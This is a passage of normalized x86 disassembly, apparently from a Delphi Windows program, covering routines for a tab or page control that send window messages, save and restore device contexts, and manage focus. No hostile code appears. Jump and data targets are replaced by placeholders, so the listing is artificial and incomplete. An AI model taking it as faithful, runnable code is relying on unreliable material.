mov eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] 0x0
lea edx [ ebp - 0x2c ]
xor ecx ecx
call sub_436540
mov eax [ ebp - 0x20 ]
call sub_4a3980
sub_4a3de4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4a3eb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x1c ]
call sub_48e6b4
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
or eax 0x2
mov [ ebp - 0x1c ] eax
mov eax edi
call sub_449db8
mov [ ebp - 0x10 ] eax
mov edx esi
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0xe4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x1c ]
call sub_496868
mov ecx esi
mov edx 0x133e
call sub_41f0dc
test eax eax
jge r-xdata
mov eax [ ebx + 0x1c ]
call sub_4a47ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3ebd
lea eax [ ebp - 0x24 ]
mov edx 0x2
call j_sub_44936c
retn
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_44be28
mov eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] 0x11
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] 0x0
lea edx [ ebp - 0x34 ]
mov ecx 0x1
pop eax
call sub_436540
mov eax [ ebp - 0x20 ]
call sub_4a3980
sub_4a3ec4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edi [ esi + 0x1c ]
mov [ edi + 0x288 ] bl
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax edi
call sub_496868
push eax
call SendMessageW
xor bl 0x1
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax [ esi + 0x1c ]
call sub_4a47ac
sub_4a3f0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_490f20
mov edx 0x121
mov eax ebx
call sub_48d5f8
mov edx 0xc1
mov eax ebx
call sub_48d62c
mov dl 0x1
mov eax ebx
call sub_496b44
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x280 ] esi
mov [ esi + 0x1c ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov esi eax
mov [ ebx + 0x260 ] esi
mov eax esi
mov edx ebx
call sub_48c730
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x268 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4a43c4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a3fcc
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
lea eax [ esi + 0x260 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ esi + 0x280 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ esi + 0x278 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ esi + 0x268 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_49107c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4a4040
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2aa ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
sub_4a4090
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax 0x8
call sub_4a37c8
mov edx edi
mov eax ebx
call sub_4926c0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4925ec
mov eax ebx
mov si 0xffc7
call sub_4483f8
and eax 0x7f
add eax eax
lea eax [ eax * 8 + rw-data ]
movzx edx [ ebx + 0x27e ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x2000000
or eax edx
movzx edx [ ebx + 0x27d ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x273 ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
cmp [ ebx + 0x1e0 ] 0x0
jne r-xdata
cmp [ ebx + 0x270 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x8000
cmp [ ebx + 0x271 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x200
cmp [ ebx + 0x272 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x4
cmp [ ebx + 0x284 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x264 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x400
or [ edi + 0x4 ] 0x2000
cmp [ ebx + 0x27c ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ edi + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
or [ edi + 0x4 ] 0x1
or [ edi + 0x4 ] 0x40
sub_4a423c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x260 ]
call sub_46e300
push ecx
movzx ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4a4278
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esi
push 0x1
mov eax ebx
call sub_496868
xor ecx ecx
mov edx 0x1328
call sub_41f0f4
cmp [ ebx + 0x27e ] 0x0
jne r-xdata
pop esi
pop ebx
retn
add [ esi + 0x4 ] 0x2
sub_4a42b0
push ebx
push ecx
mov [ esp ] edx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_4a4324
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_492594
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x26c ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4a4354
sub_4a4354
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x26c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x26c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x268 ]
call sub_44fe8c
push 0x0
xor ecx ecx
mov edx 0x1303
mov eax ebx
call sub_48f2b0
pop esi
pop ebx
retn
mov edx [ ebx + 0x268 ]
call sub_44fed0
mov edx ebx
mov eax [ ebx + 0x26c ]
call sub_42e354
mov eax [ ebx + 0x26c ]
call sub_44f4cc
push eax
xor ecx ecx
mov edx 0x1303
mov eax ebx
call sub_48f2b0
pop esi
pop ebx
retn
sub_4a43c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_44f4cc
push eax
xor ecx ecx
mov edx 0x1303
mov eax ebx
call sub_48f2b0
pop esi
pop ebx
retn
sub_4a43e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4a4462
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ esi + 0x270 ]
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4469
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
test bl bl
jne r-xdata
mov [ esi + 0x270 ] bl
test bl bl
jne r-xdata
movzx eax [ esi + 0x27e ]
cmp al 0x2
je r-xdata
mov [ esi + 0x27c ] 0x0
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44be28
mov eax [ ebp - 0x8 ]
call sub_4a3980
cmp al 0x3
jne r-xdata
sub_4a4474
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4a43e4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_492ec4
sub_4a44f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4a4579
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ esi + 0x27d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4580
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
test bl bl
je r-xdata
test bl bl
sete dl
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov [ esi + 0x27d ] bl
mov eax esi
call sub_492ec4
cmp [ esi + 0x27e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
sub_4a4588
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4a4619
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dx [ ebx + 0x286 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4620
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_44936c
retn
test dx dx
jge r-xdata
mov [ ebx + 0x286 ] dx
mov eax ebx
call sub_4a47ec
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
call sub_448088
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
sub_4a4628
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x130c
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_4a464c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4a46d7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x27e ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a46de
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
test dl dl
je r-xdata
mov [ ebx + 0x27e ] dl
cmp [ ebx + 0x270 ] 0x0
jne r-xdata
cmp [ ebx + 0x27d ] 0x0
je r-xdata
mov eax ebx
call sub_492ec4
cmp dl 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
mov dl 0x1
mov eax ebx
call sub_4a43e4
cmp dl 0x3
jne r-xdata
sub_4a46f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4a479f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dx [ ebx + 0x284 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a47a6
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_44936c
retn
test dx dx
jge r-xdata
movzx eax [ ebx + 0x284 ]
mov [ ebx + 0x284 ] dx
test ax ax
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
call sub_448088
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
mov eax ebx
call sub_492ec4
jmp r-xdata
test dx dx
jne r-xdata
mov eax ebx
call sub_4a47ec
sub_4a47ac
push ebx
mov ebx eax
cmp [ ebx + 0x288 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_492060
movzx eax [ ebx + 0x48 ]
movzx edx [ ebx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_4a47ec
push ebx
push esi
mov ebx eax
lea esi [ ebx + 0x284 ]
movzx eax [ esi ]
movzx eax ax
movzx edx [ esi + 0x2 ]
movzx edx dx
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x1329
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov eax ebx
call sub_4a47ac
pop esi
pop ebx
retn
sub_4a4828
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_4a4913
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x20 ] 0x2
mov eax [ esi + 0x280 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax esi
call sub_4a47ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a491a
lea eax [ ebp - 0x3c ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x24 ]
call j_sub_449348
retn
inc eax
mov [ ebp - 0x4 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x4 ]
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x38 ]
mov edx ebx
mov eax [ esi + 0x280 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0x11
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] 0x0
lea eax [ ebp - 0x34 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_44be28
mov eax [ ebp - 0x3c ]
mov ecx 0x1
pop edx
call sub_436540
mov eax [ ebp - 0x24 ]
call sub_4a3980
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe4 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax esi
call sub_496868
mov ecx ebx
mov edx 0x133d
call sub_41f0dc
test eax eax
jne r-xdata
sub_4a4924
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_46e3b0
xor eax eax
push ebp
push sub_4a4a02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_46e950
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_46e7e4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1b8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_46e800
mov eax [ ebp - 0x10 ]
test [ eax + 0x10 ] 0x1
setne al
push eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4a09
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
xor edx edx
call sub_46e950
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_46e7bc
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_4a4a18
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ esi + 0x280 ]
test ebx ebx
je r-xdata
call GetFocus
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov edx edi
mov eax esi
call sub_495964
xor eax eax
mov [ esi + 0x24c ] eax
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_496868
cmp ebx eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov ebx eax
mov [ esi + 0x278 ] ebx
mov edx [ esi + 0x280 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
call sub_4a42d8
mov [ esi + 0x274 ] eax
push 0x0
call SetFocus
push ebx
mov eax esi
call sub_496868
push eax
call IsChild
test eax eax
je r-xdata
sub_4a4aa8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax esi
call sub_496868
push eax
call DefWindowProcW
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4a4acc
push ebx
mov ebx eax
mov eax ebx
call sub_494a34
push 0x5
push 0x0
push 0x0
mov eax ebx
call sub_496868
push eax
call RedrawWindow
pop ebx
retn
sub_4a4aec
push ebx
mov ebx eax
mov eax ebx
call sub_495cd8
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x5
mov eax ebx
call sub_48f2b0
sub_4a4b14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_495e40
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ esi ] 0x15
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4a4b48
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0xfffffdd8
je r-xdata
mov [ edi + 0xc ] 0x1
mov eax ebx
mov si 0xffb0
call sub_4483f8
test al al
je r-xdata
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ edi + 0xc ] eax
mov eax ebx
mov si 0xffaf
call sub_4483f8
jmp r-xdata
sub_4a4b8c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4a4c61
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x280 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_495c00
inc eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ edi + 0x280 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
call sub_476f74
test al al
je r-xdata
mov eax edi
mov si 0xffb6
call sub_4483f8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
mov eax edi
mov si 0xffb0
call sub_4483f8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4c68
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
mov eax edi
mov si 0xffaf
call sub_4483f8
jmp r-xdata
sub_4a4c70
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4a4278
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_4912a8
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4a4ca0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4488a4#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov esi eax
lea edi [ edx + 0x28c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_4a4d01
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
lea esi [ eax + 0x28c ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_448cfc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4a4d38
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_490f20
mov dl 0x5
mov eax esi
call sub_48d260
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
xor edx edx
mov eax esi
call sub_48deb0
mov [ esi + 0x268 ] 0x1
mov [ esi + 0x26a ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4a4da0
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x264 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_49107c
test bl bl
jle r-xdata
cmp esi [ eax + 0x2cc ]
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
mov eax [ esi + 0x264 ]
mov edx esi
call sub_4a5968
xor edx edx
mov [ eax + 0x2cc ] edx
sub_4a4e48
push ebx
push esi
push edi
push ebp
mov esi eax
xor ebp ebp
cmp [ esi + 0x269 ] 0x0
jne r-xdata
mov eax esi
call sub_4a4e2c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
dec ebp
jmp r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc ebp
mov eax [ esi + 0x264 ]
mov eax [ eax + 0x2c0 ]
mov edx edi
call sub_4246e8
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub_4a4eb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_491230
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_4a4f10
sub_4a4f10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x264 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
test esi esi
je r-xdata
mov edx ebx
call sub_4a5968
mov edx ebx
mov eax esi
call sub_4a58b8
sub_4a4f44
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ ebx + 0x264 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x2c0 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi esi
jge r-xdata
mov eax ebx
call sub_4a4e48
mov edi eax
mov eax ebx
call sub_4a4e2c
mov edx eax
mov eax [ ebx + 0x264 ]
mov eax [ eax + 0x2c0 ]
mov ecx esi
call sub_4247f8
test edi edi
jl r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
mov [ esp + 0x8 ] edi
mov [ esp + 0xc ] 0x0
push esp
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
mov eax ebx
call sub_4a4e48
mov ecx eax
mov edx edi
mov eax [ ebx + 0x264 ]
call sub_4a5948
sub_4a4fd8
push ebx
mov ebx eax
cmp dl [ ebx + 0x269 ]
je r-xdata
pop ebx
retn
test dl dl
je r-xdata
mov eax ebx
call sub_4a4e48
mov [ ebx + 0x269 ] 0x0
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x264 ]
call sub_4a55b8
mov [ ebx + 0x269 ] 0x1
mov edx ebx
mov eax [ ebx + 0x264 ]
call sub_4a58dc
jmp r-xdata
sub_4a5030
push ebx
push esi
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_497e58
test [ ebx + 0x1c ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_496c14
test al al
jne r-xdata
mov eax [ ebx + 0x1b0 ]
add eax eax
sub [ esi ] eax
sub_4a5098
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_495c40
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1e2 ]
test al al
je r-xdata
test al al
jne r-xdata
xor eax eax
push ebp
push sub_4a50dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_4488a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4a5140
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4a51cd
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x2
jne r-xdata
mov [ esi + 0x26a ] bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a51d4
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov edi [ esi + 0x264 ]
test edi edi
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
movzx eax bl
movzx eax ax
or eax 0x0
push eax
mov eax esi
call sub_4a4e48
push eax
push 0x1333
mov eax edi
call sub_496868
push eax
call SendMessageW
jmp r-xdata
sub_4a51dc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
call sub_44c2c8
mov ebx eax
mov eax ebx
call sub_44c3d4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_49789c
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
